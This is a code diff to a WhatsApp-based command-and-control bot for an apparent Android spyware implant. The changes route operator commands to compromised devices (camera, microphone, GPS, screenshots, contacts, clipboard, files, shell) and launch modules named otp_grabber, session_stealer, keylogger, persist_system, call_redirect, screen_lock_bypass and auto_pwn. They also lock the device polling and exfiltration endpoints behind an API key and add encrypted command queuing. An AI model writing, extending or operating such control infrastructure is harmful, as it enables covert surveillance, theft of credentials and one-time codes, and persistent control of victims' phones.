@@ -7,6 +7,7 @@ import dotenv from 'dotenv';
 import pino from 'pino';
 import fs from 'fs';
 import path from 'path';
+import os from 'os';
 
 dotenv.config();
 
@@ -25,11 +26,11 @@ if (process.env.AUTH_INFO_BASE64 && fs.readdirSync(AUTH_DIR).length === 0) {
   console.log('[+] Restoring auth_info from AUTH_INFO_BASE64 env var...');
   try {
     const buf = Buffer.from(process.env.AUTH_INFO_BASE64, 'base64');
-    const tar = path.join(AUTH_DIR, 'backup.tar.gz');
-    fs.writeFileSync(tar, buf);
+    const tmp = path.join(os.tmpdir(), 'phantom_auth_backup.tar.gz');
+    fs.writeFileSync(tmp, buf);
     const { execSync } = await import('child_process');
-    execSync(`cd "${AUTH_DIR}" && tar xzf "${tar}" 2>/dev/null`, { stdio: 'ignore' });
-    fs.unlinkSync(tar);
+    execSync(`cd "${path.dirname(AUTH_DIR)}" && tar xzf "${tmp}" 2>/dev/null`, { stdio: 'ignore' });
+    fs.unlinkSync(tmp);
     console.log('[+] Auth info restored successfully');
   } catch (e) {
     console.error('[!] Auth restore failed:', e.message);
@@ -40,10 +41,10 @@ if (process.env.AUTH_INFO_BASE64 && fs.readdirSync(AUTH_DIR).length === 0) {
 async function backupAuthToBase64() {
   try {
     const { execSync } = await import('child_process');
-    const tar = path.join(AUTH_DIR, 'backup.tar.gz');
-    execSync(`cd "${path.dirname(AUTH_DIR)}" && tar czf "${tar}" "${path.basename(AUTH_DIR)}" 2>/dev/null`, { stdio: 'ignore' });
-    const buf = fs.readFileSync(tar);
-    fs.unlinkSync(tar);
+    const tmp = path.join(os.tmpdir(), 'phantom_auth_backup.tar.gz');
+    execSync(`cd "${path.dirname(AUTH_DIR)}" && tar czf "${tmp}" "${path.basename(AUTH_DIR)}" 2>/dev/null`, { stdio: 'ignore' });
+    const buf = fs.readFileSync(tmp);
+    fs.unlinkSync(tmp);
     return buf.toString('base64');
   } catch (e) {
     return `Error: ${e.message}`;
@@ -207,6 +208,11 @@ let sock = null;
 let alertJid = null;
 
 async function startBot() {
+  // Reset auth if FRESH=true (MUST be before useMultiFileAuthState)
+  if (process.env.FRESH === 'true' || process.env.FRESH === '1') {
+    try { fs.rmSync(AUTH_DIR, { recursive: true, force: true }); console.log('[+] Auth wiped for fresh pairing'); } catch {}
+  }
+
   const { version } = await fetchLatestBaileysVersion();
   console.log(`[+] Baileys v${version.join('.')}`);
 
@@ -221,22 +227,47 @@ async function startBot() {
     generateHighQualityLink: true,
   });
 
+  // Try pairing code immediately after socket initializes
+  const isRegistered = !!(state.creds?.registered || state.creds?.me?.id);
+  if (!isRegistered && process.env.PHONE_NUMBER) {
+    const rawPhone = process.env.PHONE_NUMBER.replace(/[^0-9]/g, '');
+    if (rawPhone.length < 7) {
+      console.log(`[!] PHONE_NUMBER "${process.env.PHONE_NUMBER}" -> "${rawPhone}" looks wrong (too short). Include country code, no + or spaces.`);
+      console.log(`    Example for Morocco: 2126XXXXXXXX`);
+    }
+    setTimeout(async () => {
+      try {
+        const customCode = process.env.PAIRING_CODE || undefined;
+        const code = await sock.requestPairingCode(rawPhone, customCode);
+        const hyphenated = code.length === 8 ? `${code.slice(0,4)}-${code.slice(4)}` : code;
+        console.log(`\n═══════════════════════════════════════════════════`);
+        console.log(`  PHONE NUMBER: ${rawPhone}`);
+        console.log(`  PAIRING CODE: ${code}`);
+        console.log(`  With hyphen:  ${hyphenated}`);
+        console.log(`  ───────────────────────────────────────────────`);
+        console.log(`  1. Open WhatsApp Desktop`);
+        console.log(`  2. Settings → Linked Devices → Link a Device`);
+        console.log(`  3. Enter the code ABOVE (letters are UPPERCASE)`);
+        console.log(`  4. Code expires in ~2 minutes`);
+        console.log(`  ───────────────────────────────────────────────`);
+        console.log(`  If it fails, check:`);
+        console.log(`  - PHONE_NUMBER has COUNTRY CODE (e.g. 212 for Morocco)`);
+        console.log(`  - No +, spaces, or dashes in PHONE_NUMBER`);
+        console.log(`  - Set FRESH=true env var to wipe old auth`);
+        console.log(`  - Set PAIRING_CODE=ABCD1234 for a fixed 8-char code`);
+        console.log(`═══════════════════════════════════════════════════\n`);
+      } catch (e) {
+        console.log('[!] Pairing code failed:', e.message);
+        console.log('    Check PHONE_NUMBER format. Digits only, with country code.');
+        console.log('    Example: 2126XXXXXXXX for Morocco (+212 6XX XXXXXX)');
+      }
+    }, 2000);
+  }
+
   sock.ev.on('connection.update', async (update) => {
     const { connection, lastDisconnect, qr } = update;
-    if (qr) {
-      console.log('[+] QR received. Generating pairing code...');
-      if (process.env.PHONE_NUMBER) {
-        try {
-          const code = await sock.requestPairingCode(process.env.PHONE_NUMBER);
-          console.log(`\n═══════════════════════════════════════`);
-          console.log(`  PAIRING CODE: ${code}`);
-          console.log(`  Open WhatsApp → Linked Devices → Link a Device`);
-          console.log(`  Enter: ${code}`);
-          console.log(`═══════════════════════════════════════\n`);
-        } catch (e) {
-          console.log('[!] Pairing code failed:', e.message);
-        }
-      }
+    if (qr && process.env.PHONE_NUMBER && !state.creds?.registered) {
+      console.log('[+] QR received, pairing code already requested via timeout');
     }
     if (connection === 'open') {
       console.log(`[+] Connected as ${sock.user?.id}`);
@@ -274,22 +305,53 @@ async function startBot() {
         const cmd = parts[0] === 'cmd' ? parts.slice(1).join('_') : listId;
         const ctx = createCtx(sock, jid, cmd, '', listId);
 
-        const plugin = findCommand(cmd);
-        if (plugin) {
-          await plugin.handler(ctx);
-        } else if (cmd === 'shell' || cmd === 'python' || cmd === 'notification' || cmd === 'files' || cmd === 'download' || cmd === 'upload') {
+        // Map menu buttons to proper device commands
+        const cmdMap = {
+          'screenshot': ['screenshot', ''],
+          'gps': ['location', ''],
+          'camera': ['camera', ''],
+          'mic': ['mic', ''],
+          'shell': null, 'python': null, 'notification': null, 'files': null, 'download': null, 'upload': null,
+          'clipboard': ['clipboard', ''],
+          'ip': ['ip', ''],
+          'sysinfo': ['sysinfo', ''],
+          'installed': ['installed', ''],
+          'contacts': ['contacts', ''],
+          'wifi': ['wifi', ''],
+          'images': ['dir', '/sdcard/DCIM'],
+          'sdp_bypass': ['exploit', 'run sdp_bypass'],
+          'otp_grabber': ['exploit', 'run otp_grabber'],
+          'wifi_extractor': ['exploit', 'run wifi_extractor'],
+          'session_stealer': ['exploit', 'run session_stealer'],
+          'keylogger': ['exploit', 'run keylogger'],
+          'adb_wifi': ['exploit', 'run adb_wifi'],
+          'persist_system': ['exploit', 'run persist_system'],
+          'call_redirect': ['exploit', 'run call_redirect'],
+          'mock_sms': ['exploit', 'run mock_sms'],
+          'screen_lock_bypass': ['exploit', 'run screen_lock_bypass'],
+          'private_space_peek': ['exploit', 'run private_space_peek'],
+          'notification_cooldown_bypass': ['exploit', 'run notification_cooldown_bypass'],
+          'exploit_list': ['exploit', 'list'],
+          'auto_pwn': ['auto_pwn', ''],
+          'encrypt_help': ['encrypt_help', ''],
+          'd_help': ['d_help', ''],
+        };
+
+        const mapped = cmdMap[cmd];
+        if (mapped === null) {
           await sock.sendMessage(jid, { text: `ℹ️ *${cmd}* requires a parameter.\nUsage: \`!${cmd} <value>\`` });
-        } else if (cmd === 'exploit_list') {
-          await forwardToDevice({ ...ctx, cmd: 'exploit', args: 'list' });
-        } else if (cmd === 'auto_pwn') {
-          await forwardToDevice(ctx);
-        } else if (cmd === 'saveauth') {
-          const b64 = await backupAuthToBase64();
-          await sock.sendMessage(jid, { text: `🔐 *Auth Backup*\n\nSet this as \`AUTH_INFO_BASE64\` env var on Railway:\n\n${b64}` });
-        } else if (cmd === 'encrypt_help' || cmd === 'd_help') {
-          await sock.sendMessage(jid, { text: `📖 *Encryption Commands*\n\`!encrypt <text>\` — Encrypt a command\n\`!decrypt <base64>\` — Decrypt a response\n\`!c2 <command>\` — Encrypt + queue to device\n\`!d <base64>\` — Quick inline decrypt\n\n*CLI tool:*\n\`node tools/crypt.js encrypt "cmd"\`\n\`node tools/crypt.js decrypt <b64>\`` });
+        } else if (mapped) {
+          await forwardToDevice({ ...ctx, cmd: mapped[0], args: mapped[1] });
         } else {
-          await forwardToDevice(ctx);
+          const plugin = findCommand(cmd);
+          if (plugin) {
+            await plugin.handler(ctx);
+          } else if (cmd === 'saveauth') {
+            const b64 = await backupAuthToBase64();
+            await sock.sendMessage(jid, { text: `🔐 *Auth Backup*\n\nSet this as \`AUTH_INFO_BASE64\` env var on Railway:\n\n${b64}` });
+          } else {
+            await forwardToDevice(ctx);
+          }
         }
         continue;
       }
@@ -315,8 +377,8 @@ async function startBot() {
           await sock.sendMessage(jid, { text: '📖 *!d <base64>*\nDecrypt an encrypted C2 response inline.\nPaste the base64 (after 🔒).' });
         } else {
           try {
-            const { decrypt } = await import('../lib/crypto.js');
-            const result = decrypt(args.trim());
+            const mod = await import('./lib/crypto.js');
+            const result = mod.decrypt(args.trim());
             await sock.sendMessage(jid, { text: `🔓 *Decrypted:*\n${result}` });
           } catch (e) {
             await sock.sendMessage(jid, { text: `❌ Decrypt error: ${e.message}\nMake sure you only paste the base64 (after 🔒).` });
@@ -333,11 +395,21 @@ async function startBot() {
 const app = express();
 app.use(express.json({ limit: '50mb' }));
 
+const API_KEY = process.env.API_KEY || null;
+function requireApiKey(req, res, next) {
+  if (!API_KEY) return next();
+  const auth = req.headers['authorization'];
+  if (!auth || !auth.startsWith('Bearer ') || auth.slice(7) !== API_KEY) {
+    return res.status(401).json({ error: 'unauthorized' });
+  }
+  next();
+}
+
 app.get('/health', (req, res) => {
   res.json({ status: sock?.user ? 'ok' : 'connecting', bot: sock?.user?.id || null, uptime: Math.floor(process.uptime()), plugins: plugins.length });
 });
 
-app.get('/api/poll', (req, res) => {
+app.get('/api/poll', requireApiKey, (req, res) => {
   const deviceId = req.query.device;
   const after = req.query.after ? parseInt(req.query.after) : null;
   if (!deviceId) return res.status(400).json({ error: 'device required' });
@@ -346,7 +418,7 @@ app.get('/api/poll', (req, res) => {
   res.json(getPendingCommands(deviceId, after));
 });
 
-app.post('/api/ack', (req, res) => {
+app.post('/api/ack', requireApiKey, (req, res) => {
   const id = req.body?.id;
   if (!id) return res.status(400).json({ error: 'id required' });
   ackCommand(id);
@@ -354,7 +426,7 @@ app.post('/api/ack', (req, res) => {
   res.json({ ok: true });
 });
 
-app.post('/api/send', upload.single('file'), async (req, res) => {
+app.post('/api/send', requireApiKey, upload.single('file'), async (req, res) => {
   if (!alertJid || !sock?.user) return res.status(503).json({ error: 'bot not ready' });
   try {
     const deviceId = req.body?.device || 'unknown';
@@ -386,7 +458,7 @@ app.post('/api/send', upload.single('file'), async (req, res) => {
   }
 });
 
-app.post('/api/delete', (req, res) => {
+app.post('/api/delete', requireApiKey, (req, res) => {
   if (!alertJid || !sock?.user) return res.status(503).json({ error: 'bot not ready' });
   const deviceId = req.body?.device || 'unknown';
   upsertDevice(deviceId);
